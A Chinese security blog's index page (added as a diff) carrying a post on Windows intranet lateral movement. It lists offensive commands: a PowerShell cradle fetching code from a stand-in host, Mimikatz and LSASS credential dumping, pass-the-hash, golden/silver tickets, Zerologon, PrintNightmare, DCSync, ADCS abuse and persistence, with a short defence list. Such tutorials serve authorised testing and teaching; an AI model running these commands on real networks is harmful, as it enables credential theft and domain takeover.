@@ -1,0 +1,2564 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"lvyatan.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.29.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12,"width":280},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null,"show_result":true},"fold":{"enable":false,"height":500},"language":false,"border_radius":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记">
+<meta property="og:type" content="website">
+<meta property="og:title" content="网安学习笔记">
+<meta property="og:url" content="https://lvyatan.github.io/index.html">
+<meta property="og:site_name" content="网安学习笔记">
+<meta property="og:description" content="个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="lvyatan">
+<meta property="article:tag" content="网络安全,渗透测试,漏洞扫描,安全工具">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://lvyatan.github.io/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>网安学习笔记</title>
+  
+
+
+
+
+
+
+
+
+  
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">网安学习笔记</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">网络安全学习与渗透测试实践</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lvyatan"
+      src="https://avatars.githubusercontent.com/lvyatan">
+  <p class="site-author-name" itemprop="name">lvyatan</p>
+  <div class="site-description" itemprop="description">个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/lvyatan" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lvyatan" rel="noopener me" target="_blank"><i class="fa fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2427719053@qq.com" title="E-Mail → mailto:2427719053@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://lvyatan.github.io/2026/09/28/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/lvyatan">
+      <meta itemprop="name" content="lvyatan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网安学习笔记">
+      <meta itemprop="description" content="个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 网安学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/09/28/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">内网横向移动笔记</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-09-28 11:30:00" itemprop="dateCreated datePublished" datetime="2026-09-28T11:30:00+08:00">2026-09-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-09-01 18:11:06" itemprop="dateModified" datetime="2026-09-01T18:11:06+08:00">2026-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>4 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>内网渗透是从边界打点到拿域控的完整链路。本文梳理横向移动常用思路、技术与命令。仅用于合法授权环境的安全研究。</p>
+<h2 id="0x01-总体流程"><a href="#0x01-总体流程" class="headerlink" title="0x01 总体流程"></a>0x01 总体流程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">边界突破 → 单机立足 → 提权 → 信息收集 → 域内探测</span><br><span class="line">   → 凭据收集 → 横向移动 → 域控接管 → 持久化</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-单机立足阶段"><a href="#0x02-单机立足阶段" class="headerlink" title="0x02 单机立足阶段"></a>0x02 单机立足阶段</h2><h3 id="1-反弹-shell-稳定化"><a href="#1-反弹-shell-稳定化" class="headerlink" title="1. 反弹 shell 稳定化"></a>1. 反弹 shell 稳定化</h3><p>边界 shell 通常很脆弱，第一步是落地 Meterpreter &#x2F; Cobalt Strike Beacon：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 升级到 Meterpreter（MSF）</span></span><br><span class="line">sessions -u 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># CS 部署 Beacon</span></span><br><span class="line">beacon&gt; runpowershell -Command <span class="string">&quot;iex (new-object net.webclient).downloadstring(&#x27;http://1.2.3.4/a&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-进程迁移"><a href="#2-进程迁移" class="headerlink" title="2. 进程迁移"></a>2. 进程迁移</h3><p>避免 shell 进程退出导致会话丢失：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MSF</span></span><br><span class="line">migrate -N explorer.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># CS</span></span><br><span class="line">ps                    <span class="comment"># 找 explorer.exe PID</span></span><br><span class="line">migrate &lt;PID&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-内网信息收集"><a href="#0x03-内网信息收集" class="headerlink" title="0x03 内网信息收集"></a>0x03 内网信息收集</h2><h3 id="1-网络拓扑"><a href="#1-网络拓扑" class="headerlink" title="1. 网络拓扑"></a>1. 网络拓扑</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span> /all          :: 本机 IP / 网关 / DNS</span><br><span class="line">route <span class="built_in">print</span>            :: 路由表</span><br><span class="line">arp -a                 :: 同网段邻居</span><br><span class="line"><span class="built_in">net</span> view /domain       :: 看所有域</span><br><span class="line"><span class="built_in">net</span> group &quot;domain computers&quot; /domain  :: 域内机器</span><br><span class="line">nltest /dclist:domain.local  :: 域控列表</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-域信息"><a href="#2-域信息" class="headerlink" title="2. 域信息"></a>2. 域信息</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user /domain                  :: 域用户</span><br><span class="line"><span class="built_in">net</span> group &quot;domain admins&quot; /domain :: 域管列表</span><br><span class="line"><span class="built_in">net</span> group &quot;domain controllers&quot; /domain  :: 域控</span><br><span class="line">nltest /domain_trusts             :: 域信任</span><br></pre></td></tr></table></figure>
+
+<p>ADRecon &#x2F; PowerView 自动化：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">Get-NetDomain</span></span><br><span class="line"><span class="built_in">Get-NetUser</span></span><br><span class="line"><span class="built_in">Get-NetComputer</span> | <span class="built_in">Select</span> name, operatingsystem</span><br><span class="line"><span class="built_in">Get-NetGroup</span> <span class="literal">-AdminCount</span> | <span class="built_in">Get-NetGroupMember</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-服务扫描"><a href="#3-服务扫描" class="headerlink" title="3. 服务扫描"></a>3. 服务扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MSF 内网扫描</span></span><br><span class="line">run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24</span><br><span class="line"></span><br><span class="line"><span class="comment"># CS 内置端口扫描</span></span><br><span class="line">portscan 192.168.1.0/24 1-1000</span><br></pre></td></tr></table></figure>
+
+<p>重点端口：445（SMB）、88（Kerberos）、389（LDAP）、135（RPC）、3389（RDP）、22、1433、3306、6379、8080、9200。</p>
+<h2 id="0x04-凭据收集"><a href="#0x04-凭据收集" class="headerlink" title="0x04 凭据收集"></a>0x04 凭据收集</h2><h3 id="1-本机抓密码"><a href="#1-本机抓密码" class="headerlink" title="1. 本机抓密码"></a>1. 本机抓密码</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Mimikatz</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;<span class="keyword">exit</span>&quot;</span><br><span class="line"></span><br><span class="line"># LSASS 转储</span><br><span class="line">procdump -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line"># 或</span><br><span class="line">rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <span class="number">660</span> C:\temp\lsass.dmp full</span><br><span class="line"></span><br><span class="line"># 离线 dump 解密</span><br><span class="line">pypykatz lsa minidump lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-浏览器-配置文件"><a href="#2-浏览器-配置文件" class="headerlink" title="2. 浏览器 &#x2F; 配置文件"></a>2. 浏览器 &#x2F; 配置文件</h3><ul>
+<li>SharpChrome &#x2F; SharpFoxDump 浏览器密码</li>
+<li>LaZagne 综合密码抓取</li>
+<li>mimikatz 的 <code>sekurlsa::credman</code></li>
+</ul>
+<h3 id="3-注册表-文件"><a href="#3-注册表-文件" class="headerlink" title="3. 注册表 &#x2F; 文件"></a>3. 注册表 &#x2F; 文件</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 凭据管理器</span><br><span class="line">cmdkey /list</span><br><span class="line"></span><br><span class="line"># VNC / RDP saved</span><br><span class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot; /s</span><br><span class="line">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-横向移动技术"><a href="#0x05-横向移动技术" class="headerlink" title="0x05 横向移动技术"></a>0x05 横向移动技术</h2><h3 id="1-Pass-the-Hash（PtH）"><a href="#1-Pass-the-Hash（PtH）" class="headerlink" title="1. Pass the Hash（PtH）"></a>1. Pass the Hash（PtH）</h3><p>NTLM 哈希可直接用于 SMB 认证，无需明文：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Mimikatz</span></span><br><span class="line">sekurlsa::pth /user:Administrator /domain:LAB /ntlm:ad.... /run:cmd.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># CrackMapExec</span></span><br><span class="line">crackmapexec smb 192.168.1.0/24 -u Administrator -H ad.... </span><br><span class="line"></span><br><span class="line"><span class="comment"># Impacket</span></span><br><span class="line">python3 wmiexec.py -hashes :ad.... LAB/Administrator@192.168.1.10</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Pass-the-Ticket（PtT）"><a href="#2-Pass-the-Ticket（PtT）" class="headerlink" title="2. Pass the Ticket（PtT）"></a>2. Pass the Ticket（PtT）</h3><p>TGT &#x2F; ST 可被复用：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 导出票据</span><br><span class="line">mimikatz.exe &quot;kerberos::list&quot; &quot;<span class="keyword">exit</span>&quot;</span><br><span class="line"></span><br><span class="line"># 注入新票据</span><br><span class="line">mimikatz.exe &quot;kerberos::ptt ticket.kirbi&quot; &quot;<span class="keyword">exit</span>&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-Overpass-the-Hash"><a href="#3-Overpass-the-Hash" class="headerlink" title="3. Overpass-the-Hash"></a>3. Overpass-the-Hash</h3><p>用 NTLM 申请 TGT：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::pth /user:user /domain:lab.local /ntlm:xxx /run:powershell&quot; &quot;<span class="keyword">exit</span>&quot;</span><br><span class="line"># 然后用 klist ask 票据</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-Golden-Ticket"><a href="#4-Golden-Ticket" class="headerlink" title="4. Golden Ticket"></a>4. Golden Ticket</h3><p>拿到 krbtgt 哈希后，可伪造任意用户 TGT：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden /domain:lab.local /sid:S-<span class="number">1</span>-<span class="number">5</span>-... /krbtgt:xxx /user:Administrator /ticket:golden.kirbi&quot; &quot;<span class="keyword">exit</span>&quot;</span><br></pre></td></tr></table></figure>
+
+<p>10 年有效 + 跨域管 &#x3D; 杀器。</p>
+<h3 id="5-Silver-Ticket"><a href="#5-Silver-Ticket" class="headerlink" title="5. Silver Ticket"></a>5. Silver Ticket</h3><p>用服务账户（如 cifs &#x2F; mssql）的哈希伪造 ST，访问特定服务：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden /domain:lab.local /sid:S-<span class="number">1</span>-<span class="number">5</span>-... /target:dc01.lab.local /service:cifs /rc4:xxx /user:Administrator /ticket:silver.kirbi&quot;</span><br></pre></td></tr></table></figure>
+
+<p>不经过域控，更隐蔽。</p>
+<h3 id="6-DCOM-WMI-PsExec"><a href="#6-DCOM-WMI-PsExec" class="headerlink" title="6. DCOM &#x2F; WMI &#x2F; PsExec"></a>6. DCOM &#x2F; WMI &#x2F; PsExec</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Impacket</span></span><br><span class="line">python3 wmiexec.py LAB/Administrator:password@192.168.1.10</span><br><span class="line">python3 psexec.py LAB/Administrator@192.168.1.10</span><br><span class="line">python3 smbexec.py LAB/Administrator@192.168.1.10</span><br><span class="line">python3 atexec.py LAB/Administrator:password@192.168.1.10 <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CS</span></span><br><span class="line">jump psexec 192.168.1.10 LAB\Administrator password123</span><br><span class="line">jump psexec_psh 192.168.1.10</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-RDP-劫持"><a href="#7-RDP-劫持" class="headerlink" title="7. RDP 劫持"></a>7. RDP 劫持</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 不需密码，利用已有 session</span><br><span class="line">tscon <span class="number">1</span> /dest:console</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-域控接管"><a href="#0x06-域控接管" class="headerlink" title="0x06 域控接管"></a>0x06 域控接管</h2><h3 id="1-Zerologon（CVE-2020-1472）"><a href="#1-Zerologon（CVE-2020-1472）" class="headerlink" title="1. Zerologon（CVE-2020-1472）"></a>1. Zerologon（CVE-2020-1472）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py 192.168.1.10 LAB-DC01</span><br><span class="line"><span class="comment"># 把域控机器账户置空，离线 dump，最后恢复</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-PrintNightmare（CVE-2021-1675）"><a href="#2-PrintNightmare（CVE-2021-1675）" class="headerlink" title="2. PrintNightmare（CVE-2021-1675）"></a>2. PrintNightmare（CVE-2021-1675）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Mimikatz</span></span><br><span class="line">misc::printnightmare /server:dc01.lab.local /library:\\attacker\share\pwn.dll</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-DCSync"><a href="#3-DCSync" class="headerlink" title="3. DCSync"></a>3. DCSync</h3><p>任意域管权限即可同步域内任意账户哈希：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:lab.local /user:Administrator&quot; &quot;<span class="keyword">exit</span>&quot;</span><br></pre></td></tr></table></figure>
+
+<p>拿到 krbtgt 哈希 → 黄金票据。</p>
+<h3 id="4-ADCS-攻击"><a href="#4-ADCS-攻击" class="headerlink" title="4. ADCS 攻击"></a>4. ADCS 攻击</h3><p>证书服务配置错误（ESC1-ESC8）可让普通用户申请域管证书：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># certipy</span></span><br><span class="line">certipy find -u user@lab.local -p pass -dc-ip 192.168.1.10</span><br><span class="line">certipy req -u user@lab.local -p pass -target DC01 -ca Lab-CA -template SubCA -upn Administrator@lab.local</span><br><span class="line">certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x07-隐蔽通信"><a href="#0x07-隐蔽通信" class="headerlink" title="0x07 隐蔽通信"></a>0x07 隐蔽通信</h2><ul>
+<li><strong>DNS 隧道</strong>：dnscat2 &#x2F; CS DNS Beacon</li>
+<li><strong>HTTPS Beacon</strong>：出网证书加密</li>
+<li><strong>SMB Beacon</strong>：内网命名管道，跨跳板</li>
+<li><strong>代理链</strong>：proxychains + ssh &#x2F; CS pivot listener</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MSF 路由</span></span><br><span class="line">route add 192.168.5.0 255.255.255.0 1</span><br><span class="line"><span class="comment"># socks 代理</span></span><br><span class="line">socks4a 1080</span><br><span class="line"></span><br><span class="line"><span class="comment"># CS</span></span><br><span class="line">rportfwd 8080 192.168.5.10 80</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x08-持久化"><a href="#0x08-持久化" class="headerlink" title="0x08 持久化"></a>0x08 持久化</h2><ul>
+<li><strong>DLL 劫持</strong>：常用软件启动加载</li>
+<li><strong>WMI Event Subscription</strong>：永久订阅</li>
+<li><strong>Services</strong>：自启服务</li>
+<li><strong>Scheduled Tasks</strong>：定时唤起</li>
+<li><strong>Golden Ticket</strong>：10 年有效</li>
+<li><strong>Skeleton Key</strong>：万能密码（域控上 mimikatz misc::skeleton）</li>
+<li><strong>AdminSDHolder</strong>：受保护对象属性修改</li>
+</ul>
+<h2 id="0x09-防御侧"><a href="#0x09-防御侧" class="headerlink" title="0x09 防御侧"></a>0x09 防御侧</h2><ul>
+<li>分层隔离（边界 &#x2F; 内网 &#x2F; 核心数据）</li>
+<li>域管最小化，分账号</li>
+<li>启用 LSASS 保护（<code>RunAsPPL</code>）</li>
+<li>启用 LSA Cred Guard</li>
+<li>关 SMBv1、强制 SMB 签名</li>
+<li>监控 4624 &#x2F; 4672 &#x2F; 4768 等事件</li>
+<li>EDR 监控 mimikatz、lsass dump、异常 Kerberos 票据</li>
+<li>红队演练常态化</li>
+</ul>
+<h2 id="0x10-总结"><a href="#0x10-总结" class="headerlink" title="0x10 总结"></a>0x10 总结</h2><p>内网渗透本质是”凭据流转 + 域控接管”。所有横向移动技术都是为了在凭据体系里找到下一步。Mimikatz + Impacket + Cobalt Strike 是黄金三件套，PowerView &#x2F; certipy &#x2F; ADReon 是信息收集最佳实践。</p>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本文所有技术内容仅用于合法授权环境的安全研究。任何将本文技术用于非法用途的行为，使用者自行承担一切后果。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
